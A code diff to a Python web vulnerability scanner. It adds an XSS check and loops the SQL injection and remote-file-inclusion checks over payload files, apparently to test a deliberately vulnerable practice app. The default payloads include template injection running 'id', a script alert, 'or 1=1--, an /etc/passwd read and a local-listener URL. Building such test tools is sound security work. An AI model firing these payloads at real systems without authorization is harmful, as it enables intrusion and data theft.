@@ -24,6 +24,7 @@ class Scanner:
 
         if self.args.payload == "default":
             self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+            self.xss_payload = "<script>alert('Hi')</script>"
             self.sqli_payload = "'or 1=1--"
             self.lfi_payload = "/etc/passwd"
             self.rfi_payload = "http://127.0.0.1:4444/github-token"
@@ -32,6 +33,7 @@ class Scanner:
                 raise Exception("Payload file must not be empty")
             else:
                 self.ssti_payload = open(self.args.payload)
+                self.xss_payload = open(self.args.payload)
                 self.sqli_payload = open(self.args.payload)
                 self.lfi_payload = open(self.args.payload)
                 self.rfi_payload = open(self.args.payload)
@@ -60,40 +62,46 @@ class Injection(Scanner):
             print("Encounter an error:", e)
     
     def xss(self):
-        pass
-        """
         try:
             if self.args.payload == "default":
-                request_body = {"mathexp": self.ssti_payload}
-                response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
+                request_body = {"username": self.xss_payload}
+                response = requests.post(self.url + "/api/xssreflected", json=request_body, timeout=10)
                 if response.status_code == 200:
                     print(response.text)
-                    print("Vulnerable to SSTI!\n")
+                    print("Vulnerable to XSS!\n")
                 else:
                     print("Not vulnerable")
             else:
-                for payload in self.ssti_payload.read().splitlines():
-                    request_body = {"mathexp": payload}
-                    response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
+                for payload in self.xss_payload.read().splitlines():
+                    request_body = {"username": payload}
+                    response = requests.post(self.url + "/api/xssreflected", json=request_body, timeout=10)
                     if response.status_code == 200:
                         print(response.text)
-                        print("Vulnerable to SSTI!\n")
+                        print("Vulnerable to XSS!\n")
                     else:
                         print("Not vulnerable")
         except Exception as e:
             print("Encounter an error:", e)
-        """
 
     def sqli(self):
         try:
-            request_body = {"username": self.sqli_payload, "password": "fakepass"}
-            print(request_body)
-            response = requests.post(self.url + "/api/sqlivuln", json=request_body, timeout=10)
-            if response.status_code == 200:
-                print(response.text)
-                print("Vulnerable to SQLi!\n")
+            if self.args.payload == "default":
+                request_body = {"username": self.sqli_payload, "password": "fakepass"}
+                response = requests.post(self.url + "/api/sqlivuln", json=request_body, timeout=10)
+                if response.status_code == 200:
+                    print(response.text)
+                    print("Vulnerable to SQLi!\n")
+                else:
+                    print("Not vulnerable")
             else:
-                print("Not vulnerable")
+                for payload in self.sqli_payload.read().splitlines():
+                    request_body = {"username": payload, "password": "fakepass"}
+                    response = requests.post(self.url + "/api/sqlivuln", json=request_body, timeout=10)
+                    if response.status_code == 200:
+                        print(response.text)
+                        print("Vulnerable to SQLi!\n")
+                    else:
+                        print("Not vulnerable")
         except Exception as e:
             print("Encounter an error:", e)
 
@@ -125,13 +133,23 @@ class BrokenAccessControl(Scanner):
 
     def rfi(self):
         try:
-            request_body = {"imagelink": self.rfi_payload}
-            response = requests.post(self.url + "/api/rfivuln", json=request_body, timeout=10)
-            if response.status_code == 200:
-                print(response.text)
-                print("Vulnerable to RFI!\n")
+            if self.args.payload == "default":
+                request_body = {"imagelink": self.rfi_payload}
+                response = requests.post(self.url + "/api/rfivuln", json=request_body, timeout=10)
+                if response.status_code == 200:
+                    print(response.text)
+                    print("Vulnerable to RFI!\n")
+                else:
+                    print("Not vulnerable")
             else:
-                print("Not vulnerable")
+                for payload in self.rfi_payload.read().splitlines():
+                    request_body = {"imagelink": payload}
+                    response = requests.post(self.url + "/api/rfivuln", json=request_body, timeout=10)
+                    if response.status_code == 200:
+                        print(response.text)
+                        print("Vulnerable to RFI!\n")
+                    else:
+                        print("Not vulnerable")
         except Exception as e:
             print("Encounter an error:", e)
 
